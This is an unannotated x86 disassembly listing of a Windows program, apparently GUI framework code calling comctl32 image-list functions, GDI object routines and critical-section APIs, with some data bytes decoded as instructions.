mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sub_426cb8
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx eax
sub_426d0c
retn
sub_426d80
jmp sub_403988
sub_426f97
jmp sub_403988
sub_426f9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fbb
lea eax [ ebp - 0x20 ]
call sub_404008
retn
sub_426fb4
jmp sub_403988
sub_4272c8
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4272d0
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_427344
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_4274b8
sub_42735c
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_4274b8
sub_42760c
jmp sub_403988
sub_427613
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42778b
jmp sub_403988
sub_427792
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427821
jmp sub_403988
sub_427828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42784a
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_427843
jmp sub_403988
sub_42784a
pop ebx
mov esp ebp
pop ebp
retn
sub_42785d
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_427bd4
jmp r-xdata
retn
sub_427873
call sub_427c60
retn
sub_4279f8
retn
sub_427c50
jmp sub_403988
sub_427d7b
jmp sub_403988
sub_427d82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_427d9b
jmp sub_403988
sub_427e60
push ebx
mov ebx eax
mov eax ebx
call sub_427ad0
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_427e80
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_427f8e
jmp sub_403988
sub_427fb6
jmp sub_403988
sub_427fbd
mov esp ebp
pop ebp
retn
sub_428034
jmp sub_403988
sub_42813c
jmp sub_403988
sub_428227
jmp sub_403988
sub_428234
inc [ eax + 0x4 ]
retn
sub_4283af
jmp sub_403988
sub_428760
jmp sub_403988
sub_4289aa
jmp sub_403988
sub_4289d4
jmp sub_403988
sub_4289db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4289fd
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4289f6
jmp sub_403988
sub_428a07
jmp sub_4036d4
sub_428a56
jmp sub_403988
sub_428c83
jmp sub_403988
sub_428ccb
jmp sub_403988
sub_428e38
jmp sub_403988
sub_428eff
jmp sub_4036d4
sub_428f54
mov [ eax + 0x31 ] 0x0
call sub_425f68
retn
sub_4291a5
jmp sub_403988
sub_429210
jmp sub_403988
sub_429217
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429288
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42933c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42934c
push ebx
mov ebx eax
mov eax ebx
call sub_429504
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_429360
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42937c
push ebx
mov ebx eax
mov eax ebx
call sub_429564
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4293d8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4294e7
jmp sub_403988
sub_42974b
jmp sub_4036d4
sub_4297ab
jmp sub_403988
sub_4297b2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_429b93
jmp sub_403988
sub_429bbf
jmp sub_403988
sub_429c26
jmp sub_4036d4
sub_429c57
jmp sub_403988
sub_429cdc
jmp sub_4036d4
sub_429ce1
mov eax [ ebp - 0x38 ]
call sub_403234
call sub_4039e8
call sub_403a3c
sub_429cf3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d10
mov eax [ ebp - 0x18 ]
call sub_4027bc
retn
sub_429d09
jmp sub_403988
sub_429e5f
jmp sub_4036d4
sub_42a12b
jmp sub_4036d4
sub_42a1bc
mov cl 0x1
call sub_42a1c4
retn
sub_42a4d4
xor ecx ecx
call sub_42a1c4
retn
sub_42a556
jmp sub_4036d4
sub_42a55b
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039e8
call sub_403a3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a5ac
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42a6e5
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42a714
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42a728
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42a841
jmp sub_4036d4
sub_42a8f6
jmp sub_4036d4
sub_42a960
jmp sub_4036d4
sub_42a994
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42a920
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42a9ac
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424c60
retn
mov [ eax + 0x30 ] edx
retn
sub_42a9c4
retn
sub_42a9c8
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424c60
retn
mov [ eax + 0x2c ] edx
retn
sub_42aa08
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424c60
pop ebp
retn 0x4
sub_42aa1c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424c60
pop ebp
retn 0x4
sub_42abdc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42abe8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42ac95
jmp sub_403988
sub_42ac9c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ad87
jmp sub_4036d4
sub_42adf3
jmp sub_403988
sub_42af21
jmp sub_403988
sub_42af28
pop ebp
retn
sub_42b028
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42b05d
jmp sub_403988
sub_42b064
pop ebp
retn
sub_42b068
sub [ rw-data ] 0x1
retn
sub_42b2b0
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_41a468
retn
sub_42b2e4
mov eax [ eax + 0x4 ]
call sub_41a30c
retn
sub_42b315
jmp sub_403988
sub_42b31c
pop ebp
retn
sub_42b320
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_14(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_14(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ __import_lookup_table_14(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_14(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_42b409
jmp sub_403988
sub_42b410
pop ebp
retn
sub_42b414
sub [ rw-data ] 0x1
retn
sub_42b4db
jmp sub_403988
sub_42b4e2
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42baf8
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42b504
mov [ rw-data ] sub_42b61c
mov [ rw-data ] sub_42b58c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42b820
mov [ rw-data ] sub_42b8f4
mov [ rw-data ] sub_42b9c8
retn
sub_42bb89
jmp sub_403988
sub_42bb90
pop ebp
retn
sub_42bb94
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42baf8
sub_42bbc9
jmp sub_403988
sub_42bbd0
pop ebp
retn
sub_42bbd4
sub [ rw-data ] 0x1
retn
sub_42be63
add eax 0xffffffd4
jmp sub_42c990
sub_42be6b
add eax 0xffffffd4
jmp sub_42c9ec
sub_42be73
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ae4
sub_42be7d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405b0c
sub_42c016
jmp sub_403988
sub_42c01d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c22d
jmp sub_403988
sub_42c234
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c3e9
jmp sub_403988
sub_42c44e
jmp sub_403988
sub_42c455
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c541
jmp sub_403988
sub_42c548
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c758
lea eax [ ebp - 0x30 ]
call sub_404008
lea eax [ ebp - 0x20 ]
call sub_404008
retn
sub_42c769
jmp sub_403988
j_sub_42c758
jmp sub_42c758
sub_42c770
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c86b
jmp sub_403988
sub_42c872
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c96f
jmp sub_403988
sub_42c976
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c9d6
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_42c9df
jmp sub_403988
j_sub_42c9d6
jmp sub_42c9d6
sub_42c9e6
pop ebx
pop ecx
pop ebp
retn
sub_42ca81
jmp sub_403988
sub_42ca88
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42ca94
mov eax [ eax + 0x20 ]
retn
sub_42cbc3
jmp sub_403988
sub_42cbca
pop ebp
retn
sub_42cbcc
sub [ rw-data ] 0x1
retn
sub_42cbf9
jmp sub_403988
sub_42cc00
pop ebp
retn
sub_42cc04
sub [ rw-data ] 0x1
retn
sub_42cc3d
jmp sub_403988
sub_42cc44
pop ebp
retn
sub_42cc48
sub [ rw-data ] 0x1
retn
sub_42cf55
jmp sub_403988
sub_42cf5c
pop ebp
retn
sub_42cf60
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42ccac
sub_42d040
retn
sub_42d0b4
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42d0c0
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42d0cc
mov edx [ eax ]
call [ edx ]
retn
sub_42d0d4
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42d101
jmp sub_403988
sub_42d108
pop ebp
retn
sub_42d10c
sub [ rw-data ] 0x1
retn
sub_42d2cb
jmp sub_403988
sub_42d2d2
pop ebp
retn
sub_42d687
jmp sub_403988
sub_42d68e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42daa8
jmp sub_403988
sub_42daaf
pop ebp
retn
sub_42dab4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d044
mov [ rw-data ] eax
sub_42daf5
jmp sub_403988
sub_42dafc
pop ebp
retn
sub_42db00
sub [ rw-data ] 0x1
retn
sub_42db2d
jmp sub_403988
sub_42db34
pop ebp
retn
sub_42db38
sub [ rw-data ] 0x1
retn
sub_42db65
jmp sub_403988
sub_42db6c
pop ebp
retn
sub_42db70
sub [ rw-data ] 0x1
retn
sub_42db9d
jmp sub_403988
sub_42dba4
pop ebp
retn
sub_42dba8
sub [ rw-data ] 0x1
retn
sub_42dbd5
jmp sub_403988
sub_42dbdc
pop ebp
retn
sub_42dbe0
sub [ rw-data ] 0x1
retn
sub_42dc0d
jmp sub_403988
sub_42dc14
pop ebp
retn
sub_42dc18
sub [ rw-data ] 0x1
retn
sub_42dc45
jmp sub_403988
sub_42dc4c
pop ebp
retn
sub_42dc50
sub [ rw-data ] 0x1
retn
FindTextA
jmp [ __import_lookup_table_15(comdlg32:FindTextA) ]
sub_42dc85
jmp sub_403988
sub_42dc8c
pop ebp
retn
sub_42dc90
sub [ rw-data ] 0x1
retn
sub_42dcbd
jmp sub_403988
sub_42dcc4
pop ebp
retn
sub_42dcc8
sub [ rw-data ] 0x1
retn
sub_42e282
jmp sub_4036d4
sub_42e287
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e2a4
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42e2ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403430
pop esi
retn
sub_42e2c4
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403430
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42e2dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42e385
jmp sub_403988
sub_42e3b3
jmp sub_403988
sub_42e3ba
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e3c4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42e3d8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42e5a8
call sub_403234
retn
sub_42e930
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42e944
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404278
pop esi
pop ebx
retn
sub_42e960
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42e978
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42e9ac
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42e978
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42eaa6
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42ed29
retn
sub_42ed2a
jmp sub_403988
j_sub_42ed29
jmp sub_42ed29
sub_42ed31
pop ebp
retn
sub_42f27a
inc ebx
add [ eax + 0x1d ] cl
inc ebx
add [ ebp + ebx + 0x43 ] dh
add [ eax + 0x2c00431d ] cl
and [ ebx ] eax
int3
sub_431650
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43166c
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431b02
jmp sub_4036d4
sub_431bbb
jmp sub_403988
sub_431bc2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431bc8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_431b3c
sub_431bd8
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_431b3c
sub_431be8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_431b3c
pop ebp
retn 0x8
sub_431c00
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_431d2c
push ebx
mov ebx eax
mov eax ebx
call sub_448978
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_431d40
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_431d74
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_431e78
jmp sub_403988
sub_431e7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432022
jmp sub_403988
sub_432029
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432033
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_432048
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_445c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_432064
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_445c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_432080
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_445c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43209c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_445c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4320b8
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_446940
sub_4320cc
mov al [ eax + 0x220 ]
retn
sub_432235
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_43224d
jmp sub_403988
sub_432559
jmp sub_4036d4
sub_4326cc
retn
sub_432859
jmp sub_403988
sub_4328dc
push ebx
mov ebx eax
mov eax ebx
call sub_444c74
mov eax ebx
call sub_4326d0
pop ebx
retn
sub_4328f0
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_445394
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_432a18
pop ebx
retn
sub_432a08
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_432ae1
jmp sub_403988
sub_432ae8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432b30
push ebx
mov ebx eax
mov eax ebx
call sub_4488fc
mov eax ebx
call sub_4326d0
pop ebx
retn
sub_432b44
push ebx
mov ebx eax
mov eax ebx
call sub_438dc8
mov eax ebx
call sub_4326d0
pop ebx
retn
sub_432b58
mov al 0x1
retn
sub_432b5c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_432c18
mov eax [ eax + 0x40 ]
retn
sub_432c1c
mov eax [ eax + 0x44 ]
retn
sub_432cd4
push esi
mov esi eax
mov eax esi
call sub_44871c
mov dl [ esi + 0x5f ]
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
pop esi
retn
sub_432d10
push ebx
mov ebx eax
mov eax ebx
call sub_448834
mov dl [ ebx + 0x57 ]
mov eax [ ebx + 0x220 ]
call sub_442ad8
pop ebx
retn
sub_432e90
mov [ eax + 0x228 ] edx
mov dl [ eax + 0x224 ]
call sub_432d84
retn
sub_432f2a
jmp sub_403988
sub_432f31
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433134
pop esp
0x31080047 0x43
sub_43313c
push esp
0x31000047 0x43
sub_433144
dec esp
0x30f80047 0x43
sub_43314c
inc esp
0x30f00047 0x43
sub_4332d7
retn
sub_4332d8
jmp sub_403988
j_sub_4332d7
jmp sub_4332d7
sub_4332df
pop ebp
retn
sub_4332e4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d0c
mov eax [ r-xdata ]
call sub_419ca4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
sub_433339
jmp sub_403988
sub_433340
pop ebp
retn
sub_433344
sub [ rw-data ] 0x1
retn
sub_43337d
jmp sub_403988
sub_433384
pop ebp
retn
sub_433388
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_433404
retn
sub_433405
jmp sub_403988
j_sub_433404
jmp sub_433404
sub_43340c
pop ebp
retn
sub_433410
sub [ rw-data ] 0x1
retn
sub_433418
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403234
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_433434
or al [ eax ]
add [ eax ] al
cwde
0xf9e80047 0x47
sub_433440
add [ eax ] al
add [ eax ] al
xchg esp eax
0xf7f40047 0x47
sub_43344c
add [ eax ] al
add [ eax ] al
nop
0xf7640047 0x47
sub_4334dc
jmp sub_403988
sub_4334e3
pop ebp
retn
sub_4334e8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_433434
call sub_403d58
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c40
sub_433535
jmp sub_403988
sub_43353c
pop ebp
retn
sub_433540
sub [ rw-data ] 0x1
retn
sub_43359c
jmp sub_403988
sub_4335a3
pop ebp
retn
sub_4335a8
sub [ rw-data ] 0x1
retn
sub_433604
jmp sub_403988
sub_43360b
pop ebp
retn
sub_433610
sub [ rw-data ] 0x1
retn
sub_433671
jmp sub_403988
sub_433678
pop ebp
retn
sub_43367c
sub [ rw-data ] 0x1
retn
sub_4336c8
jmp sub_403988
sub_4336cf
pop ebp
retn
sub_4336d4
sub [ rw-data ] 0x1
retn
sub_433701
jmp sub_403988
sub_433708
pop ebp
retn
sub_43370c
sub [ rw-data ] 0x1
retn
sub_4337b4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c260
mov [ rw-data ] eax
sub_4337e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_433800
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_433883
jmp sub_403988
sub_43388a
pop ebp
retn
sub_43388c
sub [ rw-data ] 0x1
retn
sub_4338fb
jmp [ edi ]
sub_433b9c
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_433bb4
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_433bf8
push ebx
mov ebx eax
mov eax ebx
call sub_434320
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43430f
jmp sub_403988
sub_434320
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42da38
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_433bc8
sub_434377
jmp sub_403988
sub_43437e
pop ebp
retn
sub_434380
sub [ rw-data ] 0x1
retn
sub_434948
jmp [ eax ]
sub_4376e4
jmp [ eax ]
sub_438943
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2729172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_438cfe
jmp sub_403988
sub_438d05
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438d8a
jmp sub_403988
sub_438d91
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438d98
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_445c60
pop ebx
retn
sub_438dac
push ebx
mov ebx eax
mov eax ebx
call sub_4489b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_445c60
pop ebx
retn
sub_438dc8
push ebx
mov ebx eax
mov eax ebx
call sub_44798c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_438e74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442bb8
pop esi
pop ebx
retn
sub_438fde
jmp sub_403988
sub_438fe5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4390f4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_444c74
mov eax ebx
mov si 0xffc7
call sub_403430
pop esi
pop ebx
retn
sub_4391e0
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4391fc
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403430
sub_439218
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_439224
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4207e4
sub_439238
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439298
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43930c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403430
pop esi
pop ebx
retn
sub_439328
push esi
mov esi eax
mov eax esi
call sub_444780
mov eax esi
mov si 0xffc7
call sub_403430
pop esi
retn
sub_4393cd
jmp sub_403988
sub_4393d4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4393dc
push ebx
mov ebx eax
mov eax ebx
call sub_4448e4
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_439400
push ebx
mov ebx eax
mov eax ebx
call sub_4448fc
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
